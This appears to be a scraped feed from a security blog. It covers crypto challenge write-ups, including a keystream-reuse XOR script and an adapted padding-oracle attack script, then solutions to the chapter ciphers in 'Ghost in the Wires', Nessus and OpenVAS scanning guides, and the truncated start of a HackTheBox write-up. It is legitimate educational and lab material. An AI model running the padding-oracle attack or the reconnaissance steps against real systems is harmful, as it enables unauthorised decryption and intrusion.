<!--kg-card-end: markdown--><p>And we're asked to decipher a second cipher (C2):</p><!--kg-card-begin: markdown--><p><code>9faAGt62D79tSa1GNhR2FbpgY3mnpyKAEVfrD7E=</code></p>
<!--kg-card-end: markdown--><p>We also know that this is an implementation of the AES block cipher in CTR mode, where both plaintexts where encrypted with the same key and IV. In these conditions we know that:</p><!--kg-card-begin: markdown--><pre><code>C1 XOR C2 = P1 XOR P2
</code></pre>
<!--kg-card-end: markdown--><p>and as such:</p><!--kg-card-begin: markdown--><pre><code>P2 = P1 XOR (C1 XOR C2)
</code></pre>
<!--kg-card-end: markdown--><p>To find P2 I created a simple Python script:</p><pre><code class="language-python">import base64

c1 = "5/KIDoW4XvtTCLZQSQl9GYBmdSC+vj2wDxP4Bbg="
c2 = "9faAGt62D79tSa1GNhR2FbpgY3mnpyKAEVfrD7E="
p1 = "this data is indeed important"

decoded_c1 = c1.decode("base64")
c1_byte_arr = bytearray(decoded_c1)
decoded_c2 = c2.decode("base64")
c2_byte_arr = bytearray(decoded_c2)
p1_byte_arr = bytearray(p1)
c1_xor_c2 = []
p2 = []

for i in range(len(c1_byte_arr)):
    xored = c1_byte_arr[i] ^ c2_byte_arr[i]
    c1_xor_c2.append(xored)

print("c1 XOR c2 = " + " ".join(map(str, c1_xor_c2)))
print("\n")

for j in range(len(c1_xor_c2)):
    xored2 = p1_byte_arr[j] ^ c1_xor_c2[j]
    p2.append(xored2)

print("p1 XOR (c1 XOR c2) = " + " ".join(map(str, p2)))</code></pre><hr><h2 id="level-2">Level 2</h2><p>On this level, we're  provided with an example of a valid cipher but not its plaintext equivalent:</p><!--kg-card-begin: markdown--><pre><code>22jBDaecKR9Sn4JXzJkxXwY/cAgC9/Gg5JImfEgQLC0=
</code></pre>
<!--kg-card-end: markdown--><p>We also have access to a server which confirms or denies the validity of any given cipher, but it also let's us know when the error is due to invalid padding, which makes it vulnerable to <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">padding oracle attacks</a>.</p><p>Instead of creating a custom Python script, I simply adapted the following PoC: <a href="https://github.com/mpgn/Padding-oracle-attack">https://github.com/mpgn/Padding-oracle-attack</a>:</p><pre><code class="language-python">import os
import sys

url = [SERVER_URL]
flag_hex = [KNOWN_VALID_FLAG_IN_HEX]
base64_error = [INVALID_BASE64_ERROR_MSG]
len_error = [INVALID_LENGTH_ERROR_MSG]
padding_error = [WRONG_PADDING_ERROR_MSG]
success_msg = [SUCCESS_MSG]

import argparse
import httplib, urllib
import re
import binascii
import os
import sys
import time
from binascii import unhexlify, hexlify
from itertools import cycle, izip

def call_oracle(hex_cipher):
    unencoded = hex_cipher.decode("hex")
    test_flag = unencoded.encode("base64")
    request = "curl -X POST -F 'encrypted=" + test_flag + "' --url " + url
    print(request)
    result = os.popen(request).read()
    if padding_error in str(result) or len_error in str(result):  #or base64_error in str(result) 
        return 0
    else:
        return 1

# the exploit don't need to touch this part
# split the cipher in len of size_block
def split_len(seq, length):
    return [seq[i:i+length] for i in range(0, len(seq), length)]

''' create custom block for the byte we search'''
def block_search_byte(size_block, i, pos, l):
    hex_char = hex(pos).split('0x')[1]
    return "00"*(size_block-(i+1)) + ("0" if len(hex_char)%2 != 0 else '') + hex_char + ''.join(l)   

''' create custom block for the padding'''
def block_padding(size_block, i):
    l = []
    for t in range(0,i+1):
        l.append(("0" if len(hex(i+1).split('0x')[1])%2 != 0 else '') + (hex(i+1).split('0x')[1]))
    return "00"*(size_block-(i+1)) + ''.join(l)

def hex_xor(s1,s2):
    return hexlify(''.join(chr(ord(c1) ^ ord(c2)) for c1, c2 in zip(unhexlify(s1), cycle(unhexlify(s2)))))

def run():
    cipher       = flag_hex
    size_block   = 16
    found        = False
    valide_value = []
    result       = []
    len_block    = size_block*2
    cipher_block = split_len(cipher, len_block)

    if len(cipher_block) == 1:
        print "[-] Abort there is only one block"
        sys.exit() 
    #for each cipher_block
    for block in reversed(range(1,len(cipher_block))):
        if len(cipher_block[block]) != len_block:
            print "[-] Abort length block doesn't match the size_block"
            break
        print "[+] Search value block : ", block, "\n"
        #for each byte of the block
        for i in range(0,size_block):
            # test each byte max 255
            for ct_pos in range(0,256):
                # 1 xor 1 = 0 or valide padding need to be checked
                if ct_pos != i+1 or (len(valide_value) &gt; 0  and int(valide_value[-1],16) == ct_pos):

                    bk = block_search_byte(size_block, i, ct_pos, valide_value) 
                    bp = cipher_block[block-1]
                    bc = block_padding(size_block, i) 

                    tmp = hex_xor(bk,bp)
                    cb  = hex_xor(tmp,bc).upper()

                    up_cipher  = cb + cipher_block[block]
                    #time.sleep(0.5)

                    # we call the oracle, our god
                    valid = call_oracle(up_cipher)

                    if valid == 1:

                        found = True

                        # data analyse and insert in rigth order
                        value = re.findall('..',bk)
                        valide_value.insert(0,value[size_block-(i+1)])
                        bytes_found = ''.join(valide_value)
                        if i == 0 and bytes_found.decode("hex") &gt; hex(size_block) and block == len(cipher_block)-1:
                            print "[-] Error decryption failed the padding is &gt; "+str(size_block)
                            sys.exit()

                        print '\033[36m' + '\033[1m' + "[+]" + '\033[0m' + " Found", i+1,  "bytes :", bytes_found
                        print ''

                        break 
            if found == False:
                # lets say padding is 01 for the last byte of the last block (the padding block)
                if len(cipher_block)-1 == block and i == 0:
                    value = re.findall('..',bk)
                    valide_value.insert(0,"01")
                else:
                    print "\n[-] Error decryption failed"
                    result.insert(0, ''.join(valide_value))
                    hex_r = ''.join(result)
                    print "[+] Partial Decrypted value (HEX):", hex_r.upper()
                    padding = int(hex_r[len(hex_r)-2:len(hex_r)],16)
                    print "[+] Partial Decrypted value (ASCII):", hex_r[0:-(padding*2)].decode("hex")
                    sys.exit()
            found = False

        result.insert(0, ''.join(valide_value))
        valide_value = []

    print ''
    hex_r = ''.join(result)
    print "[+] Decrypted value (HEX):", hex_r.upper()
    padding = int(hex_r[len(hex_r)-2:len(hex_r)],16)
    print "[+] Decrypted value (ASCII):", hex_r[0:-(padding*2)].decode("hex")

if __name__ == '__main__':                           
    run()</code></pre><p></p>]]></content:encoded></item><item><title><![CDATA[Solving the 'Ghost in the Wires' ciphers]]></title><description><![CDATA[<p>Before I was even done reading <a href="https://www.goodreads.com/book/show/10256723-ghost-in-the-wires">Ghost in the Wires</a>, I had to start solving the little ciphers that introduce each chapter.</p><p>I know there are probably hundreds of solutions online, but I really wanted to see if I could solve them on my own and learn a few new</p>]]></description><link>https://inesmartins.github.io/decrypting-the-ghost-in-the-wires-ciphers/</link><guid isPermaLink="false">5edd318f64e6e34f1b3f7ffd</guid><category><![CDATA[cryptography]]></category><category><![CDATA[ghost in the wires]]></category><category><![CDATA[book]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 07 Jun 2020 18:37:22 GMT</pubDate><media:content url="https://inesmartins.github.io/content/images/2020/06/buy-ghost.png-width-600-name-buy-ghost.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io/content/images/2020/06/buy-ghost.png-width-600-name-buy-ghost.png" alt="Solving the 'Ghost in the Wires' ciphers"><p>Before I was even done reading <a href="https://www.goodreads.com/book/show/10256723-ghost-in-the-wires">Ghost in the Wires</a>, I had to start solving the little ciphers that introduce each chapter.</p><p>I know there are probably hundreds of solutions online, but I really wanted to see if I could solve them on my own and learn a few new ciphers along the way.</p><p>During the next few weeks I hope I can find more and more solutions.</p><hr><h3 id="chapter-1-rough-start">Chapter 1 | Rough Start</h3><blockquote>Max vhlm hy max unl wkboxk B nlxw mh ingva fr hpg mktglyxkl</blockquote><p>Just by looking at the text we get the feeling that it's a valid sentence:</p><ul><li>it starts with an uppercase letter;</li><li>all the characters are letters;</li><li>there are longer words separated by shorter words, etc.</li></ul><p>So, it was only natural that the cipher was a simple ROT13, which I quickly checked using <a href="https://gchq.github.io/CyberChef/">CyberChef</a>.</p><!--kg-card-begin: markdown--><pre><code>Cipher: ROT13 with shift=7
Question: The cost of the bus driver I used to punch my own transfers.
Solution: $15
</code></pre>
<!--kg-card-end: markdown--><hr><h3 id="chapter-2-just-visiting">Chapter 2 | Just Visiting</h3><blockquote>Estd mzzv esle elfrse xp szh ez ncplep yph topyetetpd hspy T hld l acp-eppy</blockquote><p>Again, the text looked like a valid sentence, so basically the same as the previous answer just with a different shift.</p><!--kg-card-begin: markdown--><pre><code>Cipher: ROT13 with shift=15
Question: This book that taught me how to create new identities when I was a pre-teen.
Solution: The Paper Trip by Barry Reid.
</code></pre>
<!--kg-card-end: markdown--><hr><h3 id="chapter-3-original-sin">Chapter 3 | Original Sin</h3><blockquote>pbzfsobp dkfobtpkx lq pbkfi ppbkfpry aoxtolc iixz lq abpr bobt pbzfsba cl bmvq obail bpbeQ</blockquote><p>The uppercase letter at the end of the sentence made me think the chars were reversed.</p><p>After that, it was just a matter of finding the shift for the ROT13 cipher once again, which turned out to be 3, also known as <a href="https://en.wikipedia.org/wiki/ROT_cipher">Ceaser Cipher</a>.</p><!--kg-card-begin: markdown--><pre><code>Cipher: Reverse | Ceaser Cipher
Question: These older type of devices were used to call forward business lines to answering services.
Solution:
</code></pre>
<!--kg-card-end: markdown--><hr><h3 id="chapter-4-escape-artist">Chapter 4 | Escape Artist</h3><blockquote>gsvmznvlugsvnzrmuiznvhrszxpvwzgfhxrmgsvzikzmvgwzbh</blockquote><p>This one was pure trial and error.</p><!--kg-card-begin: markdown--><pre><code>Cipher: Atbash
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th>Original</th>
<th>Deciphered</th>
</tr>
</thead>
<tbody>
<tr>
<td>abcdefghijklmnopqrstuwxyz</td>
<td>gsvmznvlugsvnzrmuiznvhrszxpvwzgfhxrmgsvzikzmvgwzbh</td>
</tr>
<tr>
<td>zyxwutsrqponmlkjihgfedcba</td>
<td>thenameofthemainframesihackedatuscinthearpanetdays</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code>Question: The name of the mainframes I hacked at USC in the ARPANET days.
Solution: COSMOS
</code></pre>
<!--kg-card-end: markdown--><hr><h3 id="chapter-5-all-your-phone-lines-belong-to-me">Chapter 5 | All Your Phone Lines Belong To Me</h3><blockquote>jbi ujt veo eco ntk iwa lhc eeo anu uir trs hae oni rfn irt toh imi ets shs !eu</blockquote><p>After much over-thinking, this one was as easy as "stacking" the words and reading the letters from top to bottom, starting from the last column.</p><!--kg-card-begin: markdown--><pre><code>Cipher: Reading letters of each word top to bottom, from the last column.
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>j</td>
<td>b</td>
<td>i</td>
<td>................</td>
<td>i</td>
<td>b</td>
<td>j</td>
</tr>
<tr>
<td>u</td>
<td>j</td>
<td>t</td>
<td>................</td>
<td>t</td>
<td>j</td>
<td>u</td>
</tr>
<tr>
<td>v</td>
<td>e</td>
<td>o</td>
<td>................</td>
<td>o</td>
<td>e</td>
<td>v</td>
</tr>
<tr>
<td>e</td>
<td>c</td>
<td>o</td>
<td>................</td>
<td>o</td>
<td>c</td>
<td>e</td>
</tr>
<tr>
<td>n</td>
<td>t</td>
<td>k</td>
<td>................</td>
<td>k</td>
<td>t</td>
<td>n</td>
</tr>
<tr>
<td>i</td>
<td>w</td>
<td>a</td>
<td>................</td>
<td>a</td>
<td>w</td>
<td>i</td>
</tr>
<tr>
<td>l</td>
<td>h</td>
<td>c</td>
<td>................</td>
<td>c</td>
<td>h</td>
<td>l</td>
</tr>
<tr>
<td>e</td>
<td>e</td>
<td>o</td>
<td>................</td>
<td>o</td>
<td>e</td>
<td>e</td>
</tr>
<tr>
<td>a</td>
<td>n</td>
<td>u</td>
<td>................</td>
<td>u</td>
<td>n</td>
<td>a</td>
</tr>
<tr>
<td>u</td>
<td>i</td>
<td>r</td>
<td>................</td>
<td>r</td>
<td>i</td>
<td>u</td>
</tr>
<tr>
<td>t</td>
<td>r</td>
<td>s</td>
<td>................</td>
<td>s</td>
<td>r</td>
<td>t</td>
</tr>
<tr>
<td>h</td>
<td>a</td>
<td>e</td>
<td>................</td>
<td>e</td>
<td>a</td>
<td>h</td>
</tr>
<tr>
<td>o</td>
<td>n</td>
<td>i</td>
<td>................</td>
<td>i</td>
<td>n</td>
<td>o</td>
</tr>
<tr>
<td>r</td>
<td>f</td>
<td>n</td>
<td>................</td>
<td>n</td>
<td>f</td>
<td>r</td>
</tr>
<tr>
<td>i</td>
<td>r</td>
<td>t</td>
<td>................</td>
<td>t</td>
<td>r</td>
<td>i</td>
</tr>
<tr>
<td>t</td>
<td>o</td>
<td>h</td>
<td>................</td>
<td>h</td>
<td>o</td>
<td>t</td>
</tr>
<tr>
<td>i</td>
<td>m</td>
<td>i</td>
<td>................</td>
<td>i</td>
<td>m</td>
<td>i</td>
</tr>
<tr>
<td>e</td>
<td>t</td>
<td>s</td>
<td>................</td>
<td>s</td>
<td>t</td>
<td>e</td>
</tr>
<tr>
<td>s</td>
<td>h</td>
<td>s</td>
<td>................</td>
<td>s</td>
<td>h</td>
<td>s</td>
</tr>
<tr>
<td>!</td>
<td>e</td>
<td>u</td>
<td>................</td>
<td>u</td>
<td>e</td>
<td>!</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code>Question: I took a course on this subject when I ran from the juvenile authorities!
Solution: Criminal Justice
</code></pre>
<!--kg-card-end: markdown--><hr><h3 id="chapter-6-will-hack-for-love">Chapter 6 | Will Hack for Love</h3><blockquote>bmFtZXRoZWNvbXBhbnl3aGVyZWJvbm5pZXdhc2VtcGxveWVkd2hlbndlc3RhcnRlZGRhdGluZw==</blockquote><p>The equal signs at the end is a dead give-away for Base64.</p><!--kg-card-begin: markdown--><pre><code>Cipher: Base64
Question: Name the company where Bonnie was employed when we started dating.
Solution: GTE
</code></pre>
<!--kg-card-end: markdown--><hr><h3 id="chapter-8-lex-luthor">Chapter 8 | Lex Luthor</h3><blockquote>'siass nuhmil sowsra amnapi waagoc ifinti dscisf iiiesf ahgbao staetn itmlro</blockquote><p>Pretty similar to chapter 5, found the solution by "stacking" the words and reading each character from the bottom-left to the top-right.</p><!--kg-card-begin: markdown--><pre><code>Cipher: Stacking words | Read from bottom-left to top-right
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>'</td>
<td>s</td>
<td>i</td>
<td>a</td>
<td>s</td>
<td>s</td>
</tr>
<tr>
<td>n</td>
<td>u</td>
<td>h</td>
<td>m</td>
<td>i</td>
<td>l</td>
</tr>
<tr>
<td>s</td>
<td>o</td>
<td>w</td>
<td>s</td>
<td>r</td>
<td>a</td>
</tr>
<tr>
<td>a</td>
<td>m</td>
<td>n</td>
<td>a</td>
<td>p</td>
<td>i</td>
</tr>
<tr>
<td>w</td>
<td>a</td>
<td>a</td>
<td>g</td>
<td>o</td>
<td>c</td>
</tr>
<tr>
<td>i</td>
<td>f</td>
<td>i</td>
<td>n</td>
<td>t</td>
<td>i</td>
</tr>
<tr>
<td>d</td>
<td>s</td>
<td>c</td>
<td>i</td>
<td>s</td>
<td>f</td>
</tr>
<tr>
<td>i</td>
<td>i</td>
<td>i</td>
<td>e</td>
<td>s</td>
<td>f</td>
</tr>
<tr>
<td>a</td>
<td>h</td>
<td>g</td>
<td>b</td>
<td>a</td>
<td>o</td>
</tr>
<tr>
<td>s</td>
<td>t</td>
<td>a</td>
<td>e</td>
<td>t</td>
<td>n</td>
</tr>
<tr>
<td>i</td>
<td>t</td>
<td>m</td>
<td>l</td>
<td>r</td>
<td>o</td>
</tr>
</tbody>
</table>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code>Question: I said I wasn't this famous magician while beging a smartass to prision officials.
Solution: Harry Houdini
</code></pre>
<!--kg-card-end: markdown--><hr><h3 id="chapter-11-foul-play">Chapter 11 | Foul Play</h3><blockquote>ow gw ty kc qb eb nm ht ud pc iy ty ik tu zo dp gl qt hd</blockquote><p>This one absolutely blew my mind, I was just playing around with some online tools and came across <a href="https://scwf.dima.ninja/">this</a> website.</p><p>To see how it worked, I entered this challenge and the answer was displayed immediately, along with the cipher: <a href="https://en.wikipedia.org/wiki/Playfair_cipher">Playfair</a>.</p><p>If I had known it before, this would be an easy challenge to break, since it's one of the most well-known techniques that <strong>encrypts pairs of letters</strong> (bigrams or digrams), instead of single letters.</p><!--kg-card-begin: markdown--><pre><code>Cipher: Playfair Cipher
Question: My brother Adam listened to this type of music.
Solution: Hip Hop
</code></pre>
<!--kg-card-end: markdown--><hr><h3 id="chapter-12-you-can-never-hide">Chapter 12 | You can Never Hide</h3><blockquote>idniidhsubrseognteiyignuhrzdalrdietfetinmeablnigorcsnuatoiecli</blockquote><p><a href="https://scwf.dima.ninja/">SCWF</a> to the rescue again.</p><p>Without much effort the site found the solution using Columnar Transposition (2 1).</p><!--kg-card-begin: markdown--><pre><code>Cipher: Columnar Transposition (2 1)
Question: I identified this number as belonging to Eric using unauthorized callerID.
Solution: 310 837-5412
</code></pre>
<!--kg-card-end: markdown--><hr><h3 id="chapter-13-the-wiretapper">Chapter 13 | The Wiretapper</h3><blockquote>qclgjq'acrjcrlmqnyrcpgursmzyddmbcnngrgmfupceylyk</blockquote><p>Pretty straightforward, <a href="https://gchq.github.io/CyberChef/">CyberChef</a> saves me again.</p><!--kg-card-begin: markdown--><pre><code>Cipher: ROT13 with shift=2 | Reverse
Question: Manager who I tipped off about wiretaps on teltec's lines.
Solution:
</code></pre>
<!--kg-card-end: markdown--><hr><h3 id="chapter-14-you-tap-me-i-tap-you">Chapter 14 | You Tap Me, I Tap You</h3><blockquote>c2VuaWxzJ2RhZHltbm9zcGF0ZXJpd2VodHRjZW5ub2NlcmRuYXNlbGVnbFzb2xvHlsZm90ZGFob2h3dG5lZ2F5dGlydWNlc2xsZWJjYXBlaHQ=</blockquote><p>The equal sign at the end of the string made me think of Base64.</p><p>Once I Base64 decoded and reversed the entire string, part of the text was immediately readable.</p><p>I then removed the deciphered part of the string and tried the same process with the remaining chars.</p><p>Then, it was just a matter of tweaking the string until I could read the entire thing.</p><!--kg-card-begin: markdown--><pre><code>Cipher: (in parts) Base64 | Reverse
Question: The Pacbell Security agent who had to fly to Los Angeles and reconnect the wiretaps on my dad's lines.
Solution:
</code></pre>
<!--kg-card-end: markdown--><hr><h3 id="chapter-15-how-the-fuck-did-you-get-that">Chapter 15 | "How the fuck did you get that?"</h3><blockquote>ud mn cf ub mw re lb is ba of gx ty qc qh il ea ym nx bz ub he cf th is</blockquote><p>Seeing pairs of letters made me think of the Playfair Cipher from Chapter 11.</p><p>Again, I found the solution by running the ciphered text through <a href="https://scwf.dima.ninja/">SCWF</a>.</p><!--kg-card-begin: markdown--><pre><code>Cipher: Playfair Cipher
Question: This hacker we showed off SAS to while at Hamburger Hamlet.
Solution: Eric Heinz
</code></pre>
<!--kg-card-end: markdown--><hr><h3 id="chapter-19-revelations">Chapter 19 | Revelations</h3><blockquote>hranmoafignwoeoeiettwsoeheneteelaefnbaethscvrdniyajspwrl</blockquote><p>Pretty much the same as in Chapter 12: <a href="https://scwf.dima.ninja/">SCWF</a> identified the cipher as Columnar <a href="https://en.wikipedia.org/wiki/Transposition_cipher">Transposition Cipher</a> in a heartbeat.</p><!--kg-card-begin: markdown--><pre><code>Cipher: Columnar Transposition ( 2 1)
Question: The real name of an FBI agent whose identity was Joseph Wernle.
Solution: Joseph Ways
</code></pre>
<!--kg-card-end: markdown--><hr><h3 id="chapter-20-reverse-sting">Chapter 20 | Reverse Sting</h3><blockquote>yo kb pn oc ox rh oq kb oh kp ge gs yt yt hg sa li mt ob sa po po mk pl md</blockquote><p>Same as chapters 11 and 15, but with a little more manual tweaking.</p><!--kg-card-begin: markdown--><pre><code>Cipher: Playfair Cipher
Question: The company Teltec hacked into to get information on people.
Solution: TRW
</code></pre>
<!--kg-card-end: markdown--><hr><h3 id="chapter-25-harry-houdini">Chapter 25 | Harry Houdini</h3><blockquote>nhyitekmnryoogmwefehocttntnoauttosumooalgei</blockquote><p><a href="https://scwf.dima.ninja/">SCWF</a> helped me again by finding a pretty good solution: applying a Skip Cipher (selecting every 3rd chard) and reversing the chars.</p><!--kg-card-begin: markdown--><pre><code>Cipher: Select every 3rd char | Reverse | Rearrange words

nhyitekmnryoogmwefehocttntnoauttosumooalgei
n__i__k__r__o__w__e__c__n__o__t__s__o__l__i
__y__e__n__o__m__f__o__t__n__u__o__m__a__e
_h__t__m__y__g__e__h__t__t__a__t__u__o__g

goutatthegymtheamountofmoneyilostonceworkin
g out at the gym the amount of money i lost once workin
the amount of money i lost once working out at the gym

Question: The amount of money I lost once working out at the gym.
Solution: $11.000
</code></pre>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[Vulnerability Assessment on macOS with Nessus]]></title><description><![CDATA[<p>1. Installation</p><p>Download your version of choice from <a href="https://www.tenable.com/downloads/nessus">the Tenable website</a> and follow the installation wizard.<br>By the end a new browser tab should open up automatically with the address <a href="https://localhost:8834/">https://localhost:8834</a>.<br>Signup and wait for the final plugins to install.</p><p>2. Enter your target's IP.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/image-15.png" class="kg-image"></figure><p>3. To get</p>]]></description><link>https://inesmartins.github.io/vulnerability-assessment-on-macos-with-nessus/</link><guid isPermaLink="false">5edd307a64e6e34f1b3f7fdf</guid><category><![CDATA[nessus]]></category><category><![CDATA[macOS]]></category><category><![CDATA[vulnerability scanner]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 07 Jun 2020 18:24:04 GMT</pubDate><media:content url="https://inesmartins.github.io/content/images/2020/06/img5.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io/content/images/2020/06/img5.png" alt="Vulnerability Assessment on macOS with Nessus"><p>1. Installation</p><p>Download your version of choice from <a href="https://www.tenable.com/downloads/nessus">the Tenable website</a> and follow the installation wizard.<br>By the end a new browser tab should open up automatically with the address <a href="https://localhost:8834/">https://localhost:8834</a>.<br>Signup and wait for the final plugins to install.</p><p>2. Enter your target's IP.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/image-15.png" class="kg-image" alt="Vulnerability Assessment on macOS with Nessus"></figure><p>3. To get around this error, clear your browser's cache or open the URI in a new incognito tab.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/image-16.png" class="kg-image" alt="Vulnerability Assessment on macOS with Nessus"></figure><p>4. Start the scan.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/image-17.png" class="kg-image" alt="Vulnerability Assessment on macOS with Nessus"></figure><p>5. Check the results.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/image-18.png" class="kg-image" alt="Vulnerability Assessment on macOS with Nessus"></figure><p>6. Click on the vulnerabilities to know more about them.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/image-19.png" class="kg-image" alt="Vulnerability Assessment on macOS with Nessus"></figure><p>7. Generate a report.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/image-20.png" class="kg-image" alt="Vulnerability Assessment on macOS with Nessus"></figure><p>8. Find and kill the process where the Nessus service is running.</p><!--kg-card-begin: markdown--><pre><code>~ ps aux | grep nessus
~ sudo kill -9 [pid]
</code></pre>
<!--kg-card-end: markdown--><p>9. To relaunch the app, open a new tab with <a href="https://localhost:8834/">https://localhost:8834</a>, then run:</p><!--kg-card-begin: markdown--><pre><code>~ sudo /Library/Nessus/run/sbin/nessus-service -q
</code></pre>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[Vulnerability Assessment on with OpenVAS]]></title><description><![CDATA[<p>1. Get the latest version of OpenVAS.</p><!--kg-card-begin: markdown--><pre><code>sudo apt update
sudo apt install openvas
</code></pre>
<!--kg-card-end: markdown--><p>2. Configure OpenVAS.Make sure you copy the password that's ouputted at the end of the configuration process.</p><!--kg-card-begin: markdown--><pre><code>openvas-setup
</code></pre>
<!--kg-card-end: markdown--><p>3. If you've already configured the service you can simply run:</p><!--kg-card-begin: markdown--><pre><code>openvas-start
</code></pre>
<!--kg-card-end: markdown--><p>4. Login to the Greenbone</p>]]></description><link>https://inesmartins.github.io/openvas-on-kali-linux/</link><guid isPermaLink="false">5edd2fbd64e6e34f1b3f7fbc</guid><category><![CDATA[openvas]]></category><category><![CDATA[kali]]></category><category><![CDATA[vulnerability scanner]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 07 Jun 2020 18:21:34 GMT</pubDate><media:content url="https://inesmartins.github.io/content/images/2020/06/img0.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io/content/images/2020/06/img0.png" alt="Vulnerability Assessment on with OpenVAS"><p>1. Get the latest version of OpenVAS.</p><!--kg-card-begin: markdown--><pre><code>sudo apt update
sudo apt install openvas
</code></pre>
<!--kg-card-end: markdown--><p>2. Configure OpenVAS.Make sure you copy the password that's ouputted at the end of the configuration process.</p><!--kg-card-begin: markdown--><pre><code>openvas-setup
</code></pre>
<!--kg-card-end: markdown--><p>3. If you've already configured the service you can simply run:</p><!--kg-card-begin: markdown--><pre><code>openvas-start
</code></pre>
<!--kg-card-end: markdown--><p>4. Login to the Greenbone Security Assistant web platform (OpenVAS was developed and has been maintained by <a href="https://www.greenbone.net/en/">Greenbone Networks</a> since 2009). By the end of the configuration, a new browser tab should automatically open <a href="https://localhost:9392/">https://localhost:9392/</a>.<br>You can login with admin/[the password you copied].</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/image-10.png" class="kg-image" alt="Vulnerability Assessment on with OpenVAS"></figure><p>5. If you forget your password, you can reset it by running:</p><!--kg-card-begin: markdown--><pre><code>openvasmd --user=admin --new-password=new_password
</code></pre>
<!--kg-card-end: markdown--><p>6. Go to Scans &gt; Tasks and open the Task Wizard.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/image-11.png" class="kg-image" alt="Vulnerability Assessment on with OpenVAS"></figure><p>7. Enter your target's IP and start the vulnerability scan.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/image-12.png" class="kg-image" alt="Vulnerability Assessment on with OpenVAS"></figure><p>8. Check the results.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/image-13.png" class="kg-image" alt="Vulnerability Assessment on with OpenVAS"></figure><p>9. Click on a vulnerability to learn more.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/image-14.png" class="kg-image" alt="Vulnerability Assessment on with OpenVAS"></figure>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Heist]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/201">here</a>.</em></p><p>1. After doing an initial scan with nmap, we find 3 exposed services:</p><ul><li>a web server on port 80 which seems to be a "Support Login Page";</li><li>MSRPC on port 135;</li><li>SMBv2 on port 445.</li></ul><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/abc.png" class="kg-image"></figure><p>2. After trying and failing to access the SMB</p>]]></description><link>https://inesmartins.github.io/htb-walkthrough-heist/</link><guid isPermaLink="false">5edd2e3464e6e34f1b3f7f68</guid><category><![CDATA[windows]]></category><category><![CDATA[smb]]></category><category><![CDATA[smbv2]]></category><category><![CDATA[kali]]></category><category><![CDATA[cisco]]></category><category><![CDATA[rockyou]]></category><category><![CDATA[hashcat]]></category><category><![CDATA[impacket]]></category><category><![CDATA[crackmapexec]]></category><category><![CDATA[evil-winrm]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 07 Jun 2020 18:19:05 GMT</pubDate><media:content url="https://inesmartins.github.io/content/images/2020/06/heist.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io/content/images/2020/06/heist.png" alt="HTB Write-up | Heist"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/201">here</a>.</em></p><p>1. After doing an initial scan with nmap, we find 3 exposed services:</p><ul><li>a web server on port 80 which seems to be a "Support Login Page";</li><li>MSRPC on port 135;</li><li>SMBv2 on port 445.</li></ul><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/abc.png" class="kg-image" alt="HTB Write-up | Heist"></figure><p>2. After trying and failing to access the SMB service with null credentials, I moved on to the web server.</p><!--kg-card-begin: markdown--><pre><code>smbclient -L heist.htb
Enter WORKGROUP\root's password:
session setup failed: NT_STATUS_ACCESS_DENIED
</code></pre>
<!--kg-card-end: markdown--><p>3. Wappalyzer gives us a nice overview of this server.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/image-9.png" class="kg-image" alt="HTB Write-up | Heist"></figure><p>4. The initial page is the <a href="http://heist.htb/login.php">login</a> page, however by clicking the "Login as guest" button we're redirected to a much more interesting <a href="http://heist.htb/issues.php">issues</a> page.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/issues.png" class="kg-image" alt="HTB Write-up | Heist"></figure><p>On this page, there is what looks like a conversation between a user named Hazard and a member of the support team for a Cisco router.</p><p>5. Hazard was kind enough to provide us with a configuration file for their router, which is hosted at <a href="http://heist.htb/attachments/config.txt">http://heist.htb/attachments/config.txt</a>.<br>Unfortunately, we can't access other attachments which would have been interesting, so 